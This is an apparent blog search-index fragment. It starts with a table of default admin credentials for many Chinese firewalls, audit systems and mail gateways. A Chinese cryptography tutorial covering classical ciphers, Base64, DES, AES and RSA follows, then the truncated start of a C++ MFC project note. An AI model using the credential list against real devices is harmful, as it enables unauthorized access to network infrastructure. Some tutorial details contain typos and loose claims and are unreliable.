S5120-SI</td><td>test</td><td>123</td></tr><tr><td>H3C智能管理中心</td><td>admin</td><td>admin</td></tr><tr><td>H3C ER3100</td><td>admin</td><td>adminer3100</td></tr><tr><td>H3C ER3200</td><td>admin</td><td>adminer3200</td></tr><tr><td>H3C ER3260</td><td>admin</td><td>adminer3260</td></tr><tr><td>H3C</td><td>admin</td><td>adminer</td></tr><tr><td>admin</td><td>admin</td><td></td></tr><tr><td>admin</td><td>h3capadmin</td><td></td></tr><tr><td>h3c</td><td>h3c</td><td></td></tr><tr><td>360天擎</td><td>admin</td><td>admin</td></tr><tr><td>网神防火墙</td><td>firewall</td><td>firewall</td></tr><tr><td>天融信防火墙NGFW40000</td><td>superman</td><td>talent</td></tr><tr><td>黑盾防火墙</td><td>admin</td><td>admin</td></tr><tr><td>rule</td><td>abc123</td><td></td></tr><tr><td>audit</td><td>abc123</td><td></td></tr><tr><td>华为防火墙</td><td>telnetuser</td><td>telnetpwd</td></tr><tr><td>ftpuser</td><td>ftppwd</td><td></td></tr><tr><td>方正防火墙</td><td>admin</td><td>admin</td></tr><tr><td>飞塔防火墙</td><td>admin</td><td>密码为空</td></tr><tr><td>Juniper_SSG_5防火墙</td><td>netscreen</td><td>netscreen</td></tr><tr><td>中新金盾硬件防火墙</td><td>admin</td><td>123</td></tr><tr><td>kill防火墙(冠群金辰)</td><td>admin</td><td>sys123</td></tr><tr><td>天清汉马USG防火墙</td><td>admin</td><td>venus.fw</td></tr><tr><td>Audit</td><td>venus.audit</td><td></td></tr><tr><td>useradmin</td><td>venus.user</td><td></td></tr><tr><td>阿姆瑞特防火墙</td><td>admin</td><td>manager</td></tr><tr><td>山石网科</td><td>hillstone</td><td>hillstone</td></tr><tr><td>绿盟安全审计系统</td><td>weboper</td><td>weboper</td></tr><tr><td>webaudit</td><td>webaudit</td><td></td></tr><tr><td>conadmin</td><td>conadmin</td><td></td></tr><tr><td>admin</td><td>admin</td><td></td></tr><tr><td>shell</td><td>shell</td><td></td></tr><tr><td>绿盟产品</td><td></td><td>nsfocus123</td></tr><tr><td>TopAudit日志审计系统</td><td>superman</td><td>talent</td></tr><tr><td>LogBase日志管理综合审计系统</td><td>admin</td><td>safetybase</td></tr><tr><td>网神SecFox运维安全管理与审计系统</td><td>admin</td><td>!1fw@2soc#3vpn</td></tr><tr><td>天融信数据库审计系统</td><td>superman</td><td>telent</td></tr><tr><td>Hillstone安全审计平台</td><td>hillstone</td><td>hillstone</td></tr><tr><td>网康日志中心</td><td>ns25000</td><td>ns25000</td></tr><tr><td>网络安全审计系统(中科新业)</td><td>admin</td><td>123456</td></tr><tr><td>天玥网络安全审计系统</td><td>Admin</td><td>cyberaudit</td></tr><tr><td>明御ＷＥＢ应用防火墙</td><td>admin</td><td>admin</td></tr><tr><td>admin</td><td>adminadmin</td><td></td></tr><tr><td>明御攻防实验平台</td><td>root</td><td>123456</td></tr><tr><td>明御安全网关</td><td>admin</td><td>adminadmin</td></tr><tr><td>明御运维审计与册风险控制系统</td><td>admin</td><td>1q2w3e</td></tr><tr><td>system</td><td>1q2w3e4r</td><td></td></tr><tr><td>auditor</td><td></td><td></td></tr><tr><td>operator</td><td></td><td></td></tr><tr><td>明御网站卫士</td><td>sysmanager</td><td>sysmanager888</td></tr><tr><td>亿邮邮件网关</td><td>eyouuser</td><td>eyou_admin</td></tr><tr><td>eyougw</td><td>admin@(eyou)</td><td></td></tr><tr><td>admin</td><td>+-ccccc</td><td></td></tr><tr><td>admin</td><td>cyouadmin</td><td></td></tr><tr><td>Websense邮件安全网关</td><td>administrator</td><td>admin</td></tr><tr><td>梭子鱼邮件储存网关</td><td>admin</td><td>admin</td></tr></tbody></table><p>注明：来自 <a href="http://www.c-hasel.cn/">Corey’s Blog</a>！</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 安全 </tag>
            
            <tag> 设备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络编程————密码学</title>
      <link href="2020/12/05/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>2020/12/05/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学概论"><a href="#密码学概论" class="headerlink" title="密码学概论"></a>密码学概论</h1><h2 id="密码学是什么"><a href="#密码学是什么" class="headerlink" title="密码学是什么"></a>密码学是什么</h2><p>密码学是对安全通信技术的研究，要能够有效的防范潜在攻击</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a><strong>概念</strong></h2><p>密码学最基础的几个概念是加密，解密，密文和密钥。比如 Alice 有一段数据要传递给 Bob ，就要首先运行加密算法把数据转换成密文，密文就是一些看起来不知所云的内容。密文到了 Bob 机器上，Bob 运行对应的解密算法，就可以把密文再转换成数据。那么什么是密钥呢？其实在加密和解密运算过程中有两个要素，一个是算法，另外一个是密钥，英文叫 key 。key 就是参与加密解密运算过程的一小段数据。</p><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a><strong>理论基础</strong></h2><p>首先，当代密码学是“互联网上的密码学”。历史上，从凯撒年代，就有秘密通信的概念，所以也诞生了凯撒密码这样的加密方式。后来电气革命兴起，人们也发名了专门用于加密的硬件器材。但是真正密码学的大发展其实是计算机兴起之后。尤其是互联网到来后，所有的信息都是在公共区域进行传输，任何人都可以截取我们的数据，于是在数据传输之前进行加密就显得尤其重要，当代的密码学也是在这个情景下来发展的。</p><p>第二，我们要记住，没有不可破解的密码。理论上，任何密码至少都可以通过暴力搜索的方式来破解。互联网上的加密算法都是公开的，所以 key 的一些特征也是明确的，例如总共多少位。对于计算机来说，一个个去猜，也就是用暴力搜索的方式去破解，也是一种很容易想到的攻击方式。所以这就给加密算法的设计者提出了一个基本要求，那就是算法一定是要保证足够的计算难度。从而保证虽然理论上可以算出 key 来，但是实际中用当前的硬件需要花费的时间是不可接受的，例如一万年。当然，数学理论一直在发展，计算机的处理速度也一直在提升，所以密码学本身也是一个不断进化的学科。</p><h2 id="公钥加密的核心地位"><a href="#公钥加密的核心地位" class="headerlink" title="公钥加密的核心地位"></a><strong>公钥加密的核心地位</strong></h2><p>当代密码学一直以来是分两套系统：对称加密和非对称加密。其中非对称加密也被叫做公钥加密，密码学的最核心技术。</p><p>对称加密和非对称加密是如何区分的呢？刚刚咱们提过，加密和解密过程中都是要有 key 参与，如果加密和解密使用同一个 key ，这就是对称加密技术，否则则是非对称加密技术。非对称加密略有一些反直觉。具体做法是首先生成一对 key ，其中一个是公钥，Public Key ，公钥是可以公开给任何人的，另外一个是私钥，Private Key ，要严格保密。发送方首先拿到接收方的公钥，用公钥把信息加密，接收方收到密文后，用私钥解密获得信息。</p><p>之所以公钥和私钥能够这样配合工作，是因为它们两个天生就是一对儿，有着天然的数学联系。具体的联系方式就跟使用的具体的加密算法有关了。非对称加密中最著名的算法有两种，一个是 RSA ，这是用三个作者的名字的缩写命名的算法， 另外一个是 ECC ，也就是椭圆曲线算法。RSA 是非对称加密技术的开山鼻祖。ECC 是更高效的一种加密算法，比特币就是使用了这种加密算法。</p><p>对称加密在发送方和接收方使用相同的 key ，所以建立安全通信的前提是双方先要有共享的 key ，那么没有加密通道的情况下，key 应该如何安全的传递给对方呢？这个在互联网上是非常有挑战性的。相对比之下，公钥加密技术要分享的是公钥，不用担心泄露问题，相对要安全一些，另外公钥加密技术也衍生出了数字签名技术。</p><p>当然，公钥加密技术也需要考虑如何确认公钥所有人等技术问题，所以就有了 CA 也就是发证机构，以及 PKI 公钥基础设施等等这些的概念，这里我们就不展开了。</p><h2 id="密码与信息安全常识"><a href="#密码与信息安全常识" class="headerlink" title="密码与信息安全常识"></a>密码与信息安全常识</h2><p>使用密码的场合都是要求信息安全的，那使用密码需要注意些什么？</p><p>1.不要使用自创的加密算法</p><p>公开的密码算法都是被数学家证明过的不公开的密码算法早晚都会公诸于世</p><p>2.使用低强度密码不如不使用密码</p><p>低强度密码很可能造成假传圣旨、损失巨大</p><p>3.任何密码总有一天都会被破解</p><p>时间无限大时，密码总是会被破解的</p><p>4.密码只是信息安全的一部分</p><p>加密只是信息传递的一环，有时黑客会利用社会工程学拿到密码，那信息就会被泄露，信息安全是一个体系，密码只是其中一环</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在信息时代的今天，信息安全已上升到国家层面，我们要保障信息安全，需要做到以下几点：</p><p>1.使用密码算法对信息进行合理的加密</p><p>2.密码算法很多，每种算法都有其对应的应用场景</p><p>对称加密、非对称加密、数字签名、数字证书、数字水印</p><p>3.在信息传递过程中，防止信息窃听，密码盗取等措施都需要很好的把控才可以。</p><h1 id="历史上的密码"><a href="#历史上的密码" class="headerlink" title="历史上的密码"></a>历史上的密码</h1><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>凯撒密码是一种相传尤利乌斯 凯撒曾使用过的密码</p><p>​    凯撒与公园前100多年左右诞生与古罗马，是一位著名的军事统帅，凯撒密码被用于军事信息通信中</p><p>原理：平移算法</p><h2 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h2><p>​    凯撒密码是通过将明文中所使用的字母表平移来生成密文的</p><p>​    如果将26个字母打乱，和26个字母本身建立1对1的关系，那无论哪一种对应关系都可以作为密码</p><p>​    凯撒密码也属于这种简单密码替换的一种</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>这是一种来掩盖字母使用频率的古老方式，因为除了暴力破解，查看一条信息的字母使用频率时是破解密码最常用的方法</p><p>原理：明文会对应一串密钥，根据密钥在维吉尼亚表中生成密文</p><p>例：</p><p>​    加密：hacker</p><p>​    密钥：hello</p><p>查看生成密钥，在表中找到明文横坐标与密钥纵坐标交叉点为密文</p><table><thead><tr><th>h</th><th>a</th><th>c</th><th>k</th><th>e</th><th>r</th></tr></thead><tbody><tr><td>h</td><td>e</td><td>l</td><td>l</td><td>o</td><td>h</td></tr><tr><td>o</td><td>e</td><td>n</td><td>v</td><td>s</td><td>y</td></tr></tbody></table><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>历史上的密码最初是在军队上传递信息时使用</p><p>随着时代的发展，密码也在不断发展，从最初的凯撒密码发展到二战时的Enigma密码机</p><h1 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h1><p>Base64编码特点</p><p>​    由64个Ascii码表组成，包括A-Z、a-z、0-9、+、/64个字符表示64中状态</p><p>原理：</p><p>​    3个字节拆成4个字节</p><p>​    每个字节再根据值在Base64表中获取字符</p><p>例：    </p><table><thead><tr><th>文本</th><th align="center">M</th><th align="center">a</th><th align="center">n</th></tr></thead><tbody><tr><td>ASCLL</td><td align="center">77</td><td align="center">97</td><td align="center">110</td></tr></tbody></table><p>拆成四字节</p><table><thead><tr><th>二进制位</th><th align="center">010011</th><th align="center">010110</th><th align="center">000101</th><th align="center">101110</th></tr></thead><tbody><tr><td>索引</td><td align="center">19</td><td align="center">22</td><td align="center">5</td><td align="center">46</td></tr><tr><td>base64编码</td><td align="center">T</td><td align="center">W</td><td align="center">F</td><td align="center">u</td></tr></tbody></table><p>如果不足三个字节的特殊情况</p><p>​    1一个字节区前6位，剩余2位用0补齐6位</p><p>​    不够4个字节，后面都补上等号（=）</p><p>例</p><table><thead><tr><th>文本</th><th align="center">A</th><th align="center">a</th><th align="center">n</th></tr></thead><tbody><tr><td>二进制</td><td align="center">01000001</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>拆除四字节</p><table><thead><tr><th>二进制</th><th align="center">010000</th><th align="center">010000</th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td>Base64</td><td align="center">Q</td><td align="center">Q</td><td align="center">=</td><td align="center">=</td></tr></tbody></table><h1 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>DES是1977年灭国联邦信息处理标准（FIPS）中采用的一种对称密码，一直以来被美国以及其他国家的政府或和银行等广泛使用</p><p>直到后来DES的密文可以在短时间内破译，除了用来解密之前的密文，现在基本都不在使用了。</p><p>DES是一种将64bit的明文加密成64bit的密文的对称密码算法，虽然DES密钥长度是64bit，但每隔7bit会设置一个用于错误检查的bit，因此实质上密钥长度是56bit.DES每次只能加密64bit，如果加密的明文比较长，就需要对DES加密进行迭代，而代的具 体方式称为模式</p><p>DEs的结构（Feistel网络，典型的分组密码结构）</p><p>DEs的基本结 HorstFeistel构是由设计的，简称（Feistel网络）</p><p>在 Feistel网络中，加密的各个步骤称为轮整个加密过程就是进行若干次轮的循环。DES是一种16轮循环的 Feistel网络。</p><h2 id="Feistel网络的加密一轮循环"><a href="#Feistel网络的加密一轮循环" class="headerlink" title="Feistel网络的加密一轮循环"></a>Feistel网络的加密一轮循环</h2><p> Feistel网络的加密一轮循环</p><p>1.输入数据分为左右两部分</p><p>2.将输入的右侧发送到输出的右侧</p><p>3.将输入的右侧发送到轮函数</p><p>4.轮函数根据右侧数据和子密钥，计算出一串看上去是随机的bit序列</p><p>5.将上一步得到的bit序列与左侧数据进行XOR运算，并将结果作为加密后</p><p>的左侧。</p><p>发现：右侧没有加密，因此需要用不同的子密钥对一轮的处理重复若干次，并在每两轮处理之间将左侧和右侧数据对调，保证所有数据都被加</p><h2 id="Feistel网络的加密多轮循环"><a href="#Feistel网络的加密多轮循环" class="headerlink" title="Feistel网络的加密多轮循环"></a>Feistel网络的加密多轮循环</h2><p>第一轮加密左侧</p><p>第二轮加密右侧</p><p>第三轮加密左侧</p><p>注意：每轮加密的子密钥是不一样的</p><h2 id="Feistel网络的解密一轮循环"><a href="#Feistel网络的解密一轮循环" class="headerlink" title="Feistel网络的解密一轮循环"></a>Feistel网络的解密一轮循环</h2><p>输入部分数据分为左右两给部分</p><p>将输入的右侧发送到输出的右侧</p><p>将输入的右侧发送到轮函数</p><p>轮函数根据右侧数据和子密钥，计算出一串看上去是随机的bit序列</p><p>将上一步得到的bit序列与左侧数据进行XOR运算，并将结果作为加密后的左侧</p><p>注意：加密和加密完全一样，使用相同的子密钥即可完成解密</p><h2 id="Feistel网络的解密多轮循环"><a href="#Feistel网络的解密多轮循环" class="headerlink" title="Feistel网络的解密多轮循环"></a>Feistel网络的解密多轮循环</h2><p>第一轮解密左侧</p><p>使用子密钥3</p><p>第二轮解密右侧</p><p>使用子密钥2</p><p>第三轮解密左侧</p><p>使用子密钥1</p><h2 id="Feistel网络的密码算法特点"><a href="#Feistel网络的密码算法特点" class="headerlink" title="Feistel网络的密码算法特点"></a>Feistel网络的密码算法特点</h2><p>加密的轮数可以任意增加</p><p>加密时无论使用任何函数作为轮函数都可以正常解密</p><p>解密和解密可以用完全相同的结构来实现</p><p>同样使用Feistel网络分组算法实现的密码算法</p><p>MARS</p><p>RC6</p><p>Twofish</p><h2 id="DES算法的实现"><a href="#DES算法的实现" class="headerlink" title="DES算法的实现"></a>DES算法的实现</h2><p>1、输入的64bit数据，经过置换IP表顺序打乱</p><p>2、左侧加密公式</p><p>​    左侧+轮函数（右侧，子密钥）</p><p>3、左侧和右侧都经过16轮加密，每次使用的密钥都不同</p><p>4、子密钥的获取</p><p>5、最后输出前的64bit数据经过尾置换IP表2替换位置</p><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><p>3DES即三重DES，是为了增加DES强度，将DES重复3次所得到的一种密码算法机制</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>1、DES密钥1和DES密钥3相同，DES密钥2不同，称DES=EDE2</p><p>2、DES密钥1、2、3都不同，称DES-EDE3</p><p>3、DES密钥都相同，与DES一样</p><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>AES是取代前任标准（DES）而成为新标准的中对称密码算法。AES是一种标准，其实现算法是2000年评定的 Ri jndael算法。</p><p> Ri jndael算法是由比利时密码学家 Joan Daemen与 Vincent Ri jmen设计的分组密码算法。</p><p> Ri jndael的分组长度为128位，密钥长度可以以32位为单位在128位到256位的范围内进行选择</p><p>密钥长度在AES标准中只有128、192、256。 Rijndael算法的加密步骤分为4步：分组进行 SubBytes处理（置换）接着进行 ShiftRows处理（乱序）接着进行 MixColumns处理（移位）接着进行 AddRoundKey处理（异或）</p><h3 id="SubBytes处理"><a href="#SubBytes处理" class="headerlink" title="SubBytes处理"></a>SubBytes处理</h3><p>以每个字节的值（0-255中任意值）为索引，从一张拥有256个值的替换表（S Box）中查找出对应值的处理，也就是说将一个1字节的值替换成另一个1字节的值。</p><h3 id="ShiftRows处理"><a href="#ShiftRows处理" class="headerlink" title="ShiftRows处理"></a>ShiftRows处理</h3><p>将 SubBytes的输出以字节为单位进行打乱处理。</p><h3 id="MixColumns处理"><a href="#MixColumns处理" class="headerlink" title="MixColumns处理"></a>MixColumns处理</h3><p>对一个4字节的值进行位运算，将其变为另一个4字节值</p><h3 id="AddRoundKey处理"><a href="#AddRoundKey处理" class="headerlink" title="AddRoundKey处理"></a>AddRoundKey处理</h3><p>与轮密钥进行XOR重复轮数</p><p>需重复10-14轮</p><h3 id="Rijndael算法解密步骤分为4步"><a href="#Rijndael算法解密步骤分为4步" class="headerlink" title="Rijndael算法解密步骤分为4步"></a>Rijndael算法解密步骤分为4步</h3><p>AddRoundKey处理</p><p>InvMixColumns处理</p><p>InvShiftRows处理</p><p>InvSubBytes处理</p><h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>使用一种密钥长度够长，且在算法上没有弱点的对称密码，就可以通过密文来确保明文的</p><p>机密性。</p><p>足够长的密钥能够抵御暴力破解，算法上没有弱点可以抵御其他类型的攻击。</p><p>然而，用对称密码通信的安全核心就是密钥配送问题，即如何将密钥安全地发送给接收者。解决这个问题需要公钥密码。DEs和三重DES的分组长度都是64位</p><p>AES的分组长度可以是128位、192位、256位。</p><h1 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>公钥密码技术是为了解决对称密码技术中最难解决的两个问题而提出的一是对称密码技术的密钥分配问题二是对称密码不能实现数字签名</p><p> DiffieHellmna和于1976年在《密码学的新方向》中首次提</p><p>出了公钥密码的观点，标志着公钥密码学研究的开始1977年 Rviest由， Shmair和 Adl mena提出了第一个比较完善</p><p>的公钥密码算法，即RSA算法。从那时候起，人们基于不同的计算问题提出了大量的公钥密码算法</p><p>公钥密码（public-key- cryptography）中，密钥分为加密密</p><p>钥和解密密钥两种。</p><p>发送者用加密密钥对消息加密接收者用解密密钥对密文解密</p><p>不难发现：</p><p>发送者只需要加密密钥接收者只需要解密密钥</p><p>解密密钥不可以被窃听者获取加密密钥被窃听者获取也没问题加密密钥，可以被公开，称公钥解密密钥，不可以被公开，称私钥公钥和私钥组成密钥对</p><p>举例：</p><p>Bob与 Alice的通信</p><p>1.Bob生成密钥对</p><p>2.Bob将公钥 Alice发给</p><ol start="3"><li>Alice将消息</li></ol><p>使用Bob的公钥加密</p><ol start="4"><li>Alice将密文发送给Bob</li></ol><p>5.Bob将密文使用私钥解密读取明文消息</p><h2 id="公钥密码原理"><a href="#公钥密码原理" class="headerlink" title="公钥密码原理"></a>公钥密码原理</h2><p>从 Alice和Bob的通信模型中我们可知</p><p>公钥密码安全的核心在于在知晓公钥之后，很难求出私钥</p><p>成立条件：密文=明文与公钥计算</p><p>明文=密文与私钥计算</p><p>目标是：正向计算很简单，逆向计算非常难-》数学问题数学中的运算：加\减\乘\除\模设明文为12：</p><p>加减法：12-5=712=7+5；</p><p>乘除法：12*8=9612=96/8</p><p>模运算：12%5=212=？12=2*5+2模运算也成时钟运算，模表示：mod</p><p>数字：质数、素数、合数</p><p>质数：能够被1以及本身整除的数，1不是质数</p><p>素数：同上</p><p>合数：不是质数的数</p><p>倒数：5的倒数就是1/5</p><p>约数：因数，1的约数是1，4的约数是1，2，4</p><p>倍数：10的倍数是10，20，30</p><p>公约数：10和4的公约数是1，2</p><p>公倍数：10和4的公倍数是20，40，60</p><p>最大公约数：10和4的最大公约数是2</p><p>最小公倍数：10和4的最小公倍数是20</p><p>对数：乘方的逆运算称为对数。</p><p>7²=49;     Log₇⁴⁹=2;</p><p>离散对数：模运算中的对数称为离散对数</p><p>7² mod 13=?    49 mod 13 = 10</p><p>特点：单向运算，正向计算很容易，逆向计算很困难</p><p>7﹖ mod 13 = ？ 求乘方是很难逆向计算的如果从0开始尝试</p><p>7⁰mod13=1</p><p>7¹mod13=7</p><p>7²mod13=10</p><p>7³mod13=5</p><p>7⁴mod13=9</p><p>7⁵mod13=11</p><p>7⁶mod13=12</p><p>7⁷mod13=6</p><p>7⁸mod13=3</p><p>7⁹mod13=8</p><p>那如果7足够大，且不能被化解，？号将更难求出。这就是公钥密码算法RSA的原理。</p><h2 id="RSA密码"><a href="#RSA密码" class="headerlink" title="RSA密码"></a>RSA密码</h2><p>RSA是一种公钥密码算法，它的名称是由其三位开发者的姓氏组合</p><p>RSA可被用于公钥密码和数字密码签名</p><h3 id="RSA加密过程"><a href="#RSA加密过程" class="headerlink" title="RSA加密过程"></a>RSA加密过程</h3><table><thead><tr><th>密钥对</th><th>公钥</th><th>数E和数N</th><th></th></tr></thead><tbody><tr><td></td><td>私钥</td><td>数D和数N</td><td></td></tr><tr><td>加密</td><td></td><td>密文=明文E mod N</td><td>明文的E次方除以N的余数</td></tr><tr><td>解密</td><td></td><td>明文=密文D mod N</td><td>密文的D次方除以N的余数</td></tr></tbody></table><p>由于E和N是公钥，D和N是私钥，因此求E，D，N这三个数就是</p><h3 id="生成密钥对。"><a href="#生成密钥对。" class="headerlink" title="生成密钥对。"></a>生成密钥对。</h3><h4 id="生成步骤："><a href="#生成步骤：" class="headerlink" title="生成步骤："></a>生成步骤：</h4><p>1.求N</p><p>2.求L（L是仅在生成密钥对的过程中使用的数）</p><p>3.求E</p><p>4.求D</p><h4 id="1-求N"><a href="#1-求N" class="headerlink" title="1.求N"></a>1.求N</h4><p>N=pXq，而p和q是很大的质数，因为如果数太小，密码会变的容易破解，且质数不能被分解。</p><h4 id="2-求L"><a href="#2-求L" class="headerlink" title="2.求L"></a>2.求L</h4><p>L是在生成密钥对时出现，L是p-1和q-1的最小公倍数。最小公倍数（least common multiple，1cm）</p><p>公式：L=1cm（p-1，q-1）（L是p-1和q-1的最小公倍数）</p><h4 id="3-求E"><a href="#3-求E" class="headerlink" title="3.求E"></a>3.求E</h4><p>E是一个比1大，比L小的数。此外，E和L的最大公约数必须为最大公约数（greatest common divisor，gcd）</p><p>公式：gcd（E，L）=1    1&lt;E&lt;L    E和L的最大公约数是1（E和L互质）要找出gcd（E，L）=1的数，需要以下几步：</p><p>1.使用伪随机数生成器生成1&lt;E&lt;L范围内E的候选数</p><p>2.判断是否满足gcd（E，L）=1的条件</p><p>3.循环判断1和2直到条件成立</p><p>求最大公约数可使用欧几里得的辗转相除法</p><p>简单来说，满足gcd（E，L）=1条件能保证存在解密的数D</p><h4 id="4-求D"><a href="#4-求D" class="headerlink" title="4.求D"></a>4.求D</h4><p>数D是由数E计算得到的。D，E，L之间必须具备以下关系：</p><p>1&lt;D&lt;L</p><p> E X D mod L= 1</p><p>只要数D满足上述条件，则通过E和N进行加密的密文，就可以</p><p>通过D和N进行解密。</p><p>简单来说， E X D mod L=1保证了对密文进行解密时能够得到原来的明文。</p><h4 id="公式总结"><a href="#公式总结" class="headerlink" title="公式总结"></a>公式总结</h4><table><thead><tr><th>求N</th><th>求E</th></tr></thead><tbody><tr><td>N = pxq，用伪随机数生成器求p和q，p和q都是质数</td><td>gcd（E，L）=1，1&lt;E&lt;L ,E和L的最大公约数时1（E和L互质）</td></tr><tr><td>求L</td><td>求D</td></tr><tr><td>L=1cm（p-1，q-1），（L是p-1和q-1的最小公倍数）</td><td>1&lt;D&lt;L,E X D mod L = 1</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="1-求N-1"><a href="#1-求N-1" class="headerlink" title="1.求N"></a>1.求N</h4><p>N pxq，p=17，q=19，（17，19都是质数），N=17X19=323</p><h4 id="2-求L-1"><a href="#2-求L-1" class="headerlink" title="2.求L"></a>2.求L</h4><p>L是p-1和q-1的最小公倍数</p><p>L=lcm(p-1,q-1)=1cm(16,18)=144</p><h4 id="3-求E-1"><a href="#3-求E-1" class="headerlink" title="3.求E"></a>3.求E</h4><p>E和L的最大公约数必须是1，即gcd（E，L）=1</p><p>满足条件的有：5，7，11，13，17，19，23，…</p><p>选择E=5</p><h4 id="4-求D-1"><a href="#4-求D-1" class="headerlink" title="4.求D"></a>4.求D</h4><p> E X D mod L=1    -&gt;5 X D mod 144=1</p><p>D=29</p><h4 id="1-生成密钥对"><a href="#1-生成密钥对" class="headerlink" title="1.生成密钥对"></a>1.生成密钥对</h4><p>公钥：E=5，N=323</p><p>私钥：D=29，N=323</p><h4 id="2-使用公钥加密明文，明文必须小于N"><a href="#2-使用公钥加密明文，明文必须小于N" class="headerlink" title="2.使用公钥加密明文，明文必须小于N"></a>2.使用公钥加密明文，明文必须小于N</h4><p>设明文=123</p><p>加密：密文=明文E次方 mod N</p><p>密文=123⁵ mod 323 = 28153056843 mod 323 =225</p><h4 id="3-使用私钥解密明文"><a href="#3-使用私钥解密明文" class="headerlink" title="3.使用私钥解密明文"></a>3.使用私钥解密明文</h4><p>解密：明文=密文D次方 mod N</p><p>明文=225²²⁹ mod 323 = 123</p><h4 id="1-通过密文获取明文"><a href="#1-通过密文获取明文" class="headerlink" title="1.通过密文获取明文"></a>1.通过密文获取明文</h4><p>公式：明文=密文D次方 mod N</p><p>明文=密文modD次方 N</p><p>求密文D次方等于求对数</p><p>求密文D次方 mod N等于求离散对数这是世界难题！</p><h4 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2.暴力破解"></a>2.暴力破解</h4><p>求出D就可以解密，但如果D足够大，是很难暴力破解的。</p><h4 id="3-通过E和N求出D"><a href="#3-通过E和N求出D" class="headerlink" title="3.通过E和N求出D"></a>3.通过E和N求出D</h4><p>加密：密文=明文E次方 mod N</p><p>N如果能进行分解，求出p和q，D就能求出大整数进行质因数分解，也是世界难题！</p><p>p和q是伪随机数生成器生成的，如果伪随机数生成器算法很差能够碰撞成功也可以破解。</p>]]></content>
      
      
      <categories>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 编程 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全卫士————项目笔记</title>
      <link href="2020/12/05/%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E7%AC%94%E8%AE%B0/"/>
      <url>2020/12/05/%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h1><h2 id="TAB控件的封装与使用"><a href="#TAB控件的封装与使用" class="headerlink" title="TAB控件的封装与使用"></a>TAB控件的封装与使用</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//封装的Tab控件函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTabDlg::InitTab</span><span class="params">(<span class="keyword">int</span> nCount, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">va_list  vl;</span><br><span class="line">va_start(vl, nCount);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1 获取这一个选项，需要的数据</span></span><br><span class="line"><span class="keyword">wchar_t</span>* szTabItemName = va_arg(vl, <span class="keyword">wchar_t</span>*);</span><br><span class="line">CDialogEx* pDlg = va_arg(vl, CDialogEx*);</span><br><span class="line">DWORD dwId = va_arg(vl, DWORD);</span><br><span class="line"><span class="comment">//2 